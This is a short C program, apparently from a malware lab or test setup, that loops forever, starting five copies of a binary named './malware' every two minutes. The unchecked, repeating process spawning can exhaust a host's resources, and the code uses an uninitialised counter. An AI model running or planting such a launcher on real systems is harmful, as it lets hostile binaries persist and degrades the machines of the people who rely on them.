#include<stdlib.h>
#include<unistd.h>
#include<stdio.h>
#include<string.h>
// the root of all malwares
// fork 5 children, sleep for 2 mins, repeat
int main(){
    printf("%d\n" , getpid());
    char ** args = (char **)malloc(2*sizeof(char*));
    args[0] = strdup("./malware");
    args[1] = NULL;
    int i;
    while(1){
        printf("%d\n",i++);
        for(int i=0;i<5;i++){
            int cpid = fork();
            if(cpid == 0){
                execvp(args[0] , args);
                exit(0);
            }
        }
        sleep(120);
    }
    return 0;
}